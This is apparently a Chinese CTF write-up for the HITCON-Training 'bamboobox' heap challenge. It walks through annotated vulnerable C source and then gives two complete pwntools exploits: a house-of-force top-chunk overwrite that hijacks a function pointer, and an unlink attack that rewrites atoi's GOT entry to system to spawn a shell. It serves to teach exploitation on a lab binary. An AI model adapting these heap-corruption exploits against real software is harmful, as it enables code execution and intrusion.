---
layout: post
title: bamboobox house of force and unlink
excerpt: "house of force and unlink"
categories: [Writeup]
comments: true
---

首先查看下源码
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
struct item{			
	int size ;
	char *name ;
};

struct item itemlist[100] = {0}; 

int num ;

void hello_message(){						//这个没什么用
	puts("There is a box with magic");
	puts("what do you want to do in the box");
}

void goodbye_message(){						//没什么用
	puts("See you next time");
	puts("Thanks you");
}

struct box{								//通过指针运行两个函数
	void (*hello_message)();
	void (*goodbye_message)();
};

void menu(){								//就是一堆介绍
	puts("----------------------------");
	puts("Bamboobox Menu");
	puts("----------------------------");
	puts("1.show the items in the box");
	puts("2.add a new item");
	puts("3.change the item in the box");
	puts("4.remove the item in the box");
	puts("5.exit");
	puts("----------------------------");
	printf("Your choice:");
}


void show_item(){
	int i ;
	if(!num){		//num = 0
		puts("No item in the box");		
	}else{
		for(i = 0 ; i < 100; i++){
			if(itemlist[i].name){				// 遍历找到name不为空的,然后打印
				printf("%d : %s",i,itemlist[i].name);
			}
		}
		puts("");
	}
}

int add_item(){

	char sizebuf[8] ;
	int length ;
	int i ;
	int size ;
	if(num < 100){
		printf("Please enter the length of item name:");
		read(0,sizebuf,8);
		length = atoi(sizebuf);
		if(length == 0){
			puts("invaild length");
			return 0;
		}
		for(i = 0 ; i < 100 ; i++){
			if(!itemlist[i].name){			//遍历找到name为空的位置
				itemlist[i].size = length ;
				itemlist[i].name = (char*)malloc(length);	//根据输入的长度进行malloc
				printf("Please enter the name of item:");
				size = read(0,itemlist[i].name,length);		//申请相应长度,写入,然后末尾\x00
				itemlist[i].name[size] = '\x00';
				num++;
				break;
			}
		}
	
	}else{
		puts("the box is full");
	}
	return 0;
}



void change_item(){

	char indexbuf[8] ;
	char lengthbuf[8];
	int length ;
	int index ;
	int readsize ;

	if(!num){
		puts("No item in the box");
	}else{
		printf("Please enter the index of item:");
		read(0,indexbuf,8);
		index = atoi(indexbuf);
		if(itemlist[index].name){	//如果这个item存在
			printf("Please enter the length of item name:");
			read(0,lengthbuf,8);
			length = atoi(lengthbuf);		//重新输入长度,写入
			printf("Please enter the new name of the item:");
			readsize = read(0,itemlist[index].name,length);	// 这里存在明显的堆溢出
			*(itemlist[index].name + readsize) = '\x00';
		}else{
			puts("invaild index");
		}
		
	}	

}

void remove_item(){
	char indexbuf[8] ;
	int index ;

	if(!num){
		puts("No item in the box");
	}else{
		printf("Please enter the index of item:");
		read(0,indexbuf,8);
		index = atoi(indexbuf);		//输入remove的序号
		if(itemlist[index].name){
			free(itemlist[index].name);		//如果存在就free掉这个
			itemlist[index].name = 0 ;
			itemlist[index].size = 0 ;		//然后置零
			puts("remove successful!!");
			num-- ;
		}else{
			puts("invaild index");
		}
	}
}

void magic(){			//最终运行这个函数就成功了
	int fd ;
	char buffer[100];
	fd = open("/home/bamboobox/flag",O_RDONLY);
	read(fd,buffer,sizeof(buffer));
	close(fd);
	printf("%s",buffer);
	exit(0);
}

int main(){
	
	char choicebuf[8];
	int choice;
	struct box *bamboo ;		// 两个函数指针
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	bamboo = malloc(sizeof(struct box));	//申请空间
	bamboo->hello_message = hello_message;
	bamboo->goodbye_message = goodbye_message ;
	bamboo->hello_message();				//为两个函数指针赋值,并运行其中一个

	while(1){
		menu();
		read(0,choicebuf,8);
		choice = atoi(choicebuf);
		switch(choice){				//根据输入的选择运行相应的函数
			case 1:
				show_item();
				break;
			case 2:
				add_item();
				break;
			case 3:
				change_item();
				break;
			case 4:
				remove_item();
				break;
			case 5:
				bamboo->goodbye_message();		//大概是劫持函数到magic
				exit(0);
				break;
			default:
				puts("invaild choice!!!");
				break;
		
		}	
	}
	return 0 ;
}
```
利用思路

1. 利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。
2. 利用 house of force 技巧，分配 chunk 至堆的基地址。
3. 然后修改之

最终的exp

```
#coding=utf-8
from pwn import *

def add(r,length,name):
    r.recvuntil('Your choice:')
    r.sendline('2')
    r.recvuntil('Please enter the length of item name:')
    r.sendline(length)
    r.recvuntil('Please enter the name of item:')
    r.sendline(name)

def show(r):
    r.recvuntil('Your choice:')
    r.sendline('1')

def change(r,index,length,name):
    r.recvuntil('Your choice:')
    r.sendline('3')
    r.recvuntil('Please enter the index of item:')
    r.sendline(index)
    r.recvuntil('Please enter the length of item name:')
    r.sendline(length)
    r.recvuntil('Please enter the new name of the item:')
    r.sendline(name)

def remove(r,index):
    r.recvuntil('Your choice:')
    r.sendline('4')
    r.recvuntil('Please enter the index of item:')
    r.sendline(index)

#       0x6020c0 <itemlist>
#       0x400d49 <magic>
#   gdb-peda$ x/4gx 0x603000
#   0x603000:	0x0000000000000000	0x0000000000000021
#   0x603010:	0x0000000000000000	0x0000000000000000

'''
gdb-peda$ x/44gx 0x0000000000603030
0x603030:	0x6161616161616161	0x6161616161616161
0x603040:	0x6161616161616161	0x6161616161616161
0x603050:	0x6161616161616161	0x6161616161616161
0x603060:	0x6161616161616161	0xffffffffffffffff
'''

'''
bamboo 地址   RAX: 0x603010 --> 0x0
我们要修改的地址  0x603010
topchun 地址  0x603060
计算的结果: 0x603010 - 0x603060 -0x20 = 0x70
'''

if __name__ =='__main__':
    magic = 0x400d49
    r = process('./bamboobox')
    add(r,str(0x30),'aaaa') # 0
    payload=0x30*'a'+'a'*8+p64(0xffffffffffffffff)
    change(r,str(0),str(0x40),payload)			#这里利用一个堆溢出,覆盖topchunk
                                                # 通过计算chunk出现的位置,写出特定大小的malloc,
    add(r,str(-0x70),'bbbb')		    # 据说是 减小top chunk指针,这一步很必要

    add(r,str(0x10),p64(magic)*2)		#这里将函数指针覆盖
    raw_input('#')
    r.sendline('5')				#触发
    r.interactive()
```
最终的运行结果

```
 H localhost.localdomain  root  ~ | HITCON-Training | LAB | lab11  python exp.py 
[+] Starting local process './bamboobox': pid 14235
[*] '/root/HITCON-Training/LAB/lab11/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
Please enter the length of item name:Please enter the name of item:[*] Process './bamboobox' stopped with exit code 0 (pid 14235)
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:this is mortyflag@@
```

#### 另一种unlink解法

通过unlink让ptr最终指向的是ptr前面一点的地方，往ptr里面写payload就能够覆盖ptr本身。然后再次往ptr里面写payload，就能实现地址任意写了。

最终的exp

```
#coding=utf-8
from pwn import *

def add(r,length,name):
    r.recvuntil('Your choice:')
    r.sendline('2')
    r.recvuntil('Please enter the length of item name:')
    r.sendline(length)
    r.recvuntil('Please enter the name of item:')
    r.sendline(name)

def show(r):
    r.recvuntil('Your choice:')
    r.sendline('1')



def change(r,index,length,name):
    r.recvuntil('Your choice:')
    r.sendline('3')
    r.recvuntil('Please enter the index of item:')
    r.sendline(index)
    r.recvuntil('Please enter the length of item name:')
    r.sendline(length)
    r.recvuntil('Please enter the new name of the item:')
    r.sendline(name)


def remove(r,index):
    r.recvuntil('Your choice:')
    r.sendline('4')
    r.recvuntil('Please enter the index of item:')
    r.sendline(index)

if __name__ =='__main__':
    r = process('./bamboobox')
#  magic            0x400d49
#  goodbye          0x4008b1
#  item[0].name     0x6020c8
    ptr = 0x6020c8      # 这个就是item[0].name的位置
    add(r,'64','aaaa') #0x40
    add(r,'128','bbbb')#0x80
    add(r,'64','cccc')
    fake_chunk = p64(0)  # prev_size		fake_chunk 40byte
    fake_chunk += p64(0x41)  # size
    fake_chunk += p64(ptr - 0x18)  # fd
    fake_chunk += p64(ptr - 0x10)  # bk
    fake_chunk += "a"*0x20

    fake_chunk += p64(0x40)+p64(0x90)       #覆盖使前一个chunk也是40byte

    change(r,'0','128',fake_chunk)          # 进行堆溢出
    raw_input('#1')
    remove(r,'1')                           #触发 unlink操作,效果就是0x6020c8指向的值由603030变为了06020b0(指向了ptr前面一点的位置,可以通过改写值,覆盖ptr,实现ptr值的改写)
    raw_input('#2')

    payload = p64(0) * 2+ p64(0x40) + p64(0x602068)  # 这个地址是atoi_got位置

    change(r,'0', '128', payload)
    show(r)
    r.recvuntil("0 : ")
    atoi = u64(r.recvuntil(":")[:6].ljust(8, "\x00"))
    libc = atoi - 0x378f0
    print "libc:", hex(libc)
    system = libc + 0x432c0
    change(r,'0', '8', p64(system))
    r.recvuntil(":")
    r.sendline("sh")
    r.interactive()
```
